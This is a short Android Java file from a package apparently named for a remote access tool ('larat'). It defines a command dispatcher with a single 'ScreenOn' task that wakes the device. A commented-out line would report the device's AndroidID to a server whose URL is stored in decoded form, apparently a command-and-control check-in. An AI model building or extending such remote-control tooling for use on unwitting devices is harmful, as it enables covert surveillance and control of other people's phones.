package com.c4wd.larat;

import android.content.Context;
import android.os.AsyncTask;
import android.os.PowerManager;
import android.preference.PreferenceManager;

import java.io.UnsupportedEncodingException;
import java.util.HashMap;
import java.util.LinkedList;
import java.util.List;

/**
 * Created by cory on 10/4/15.
 */
public class Command {

    public static HashMap<String, AsyncTask> commandList;

    public static AsyncTask getTask(String id) {
        return commandList.get(id);
    }

    public static void initCommands() {
        Command.commandList = new HashMap<String, AsyncTask>();

        commandList.put("ScreenOn", new ScreenOnTask());
    }

    public static class ScreenOnTask extends AsyncTask<Object, Void, String> {
        @Override
        protected String doInBackground(Object... ctx) {
            PowerManager pm = (PowerManager) ((CommandContext)ctx[0]).getContext().getSystemService(Context.POWER_SERVICE);
            final PowerManager.WakeLock wl = pm.newWakeLock(PowerManager.SCREEN_BRIGHT_WAKE_LOCK |PowerManager.ACQUIRE_CAUSES_WAKEUP |PowerManager.ON_AFTER_RELEASE, "");
            wl.acquire();
            return "Executed";
        }
        @Override
        protected void onPostExecute(String result) {
            //getInputStreamFromUrl(Constants.getDecodedUrl()  + Constants.urlPostInfo + "UID=" + PreferenceManager.getDefaultSharedPreferences(appContext).getString("AndroidID", "") + "&Data=", "Screen On Complete");
        }
        @Override
        protected void onPreExecute() {}
        @Override
        protected void onProgressUpdate(Void... values) {}
    }
}
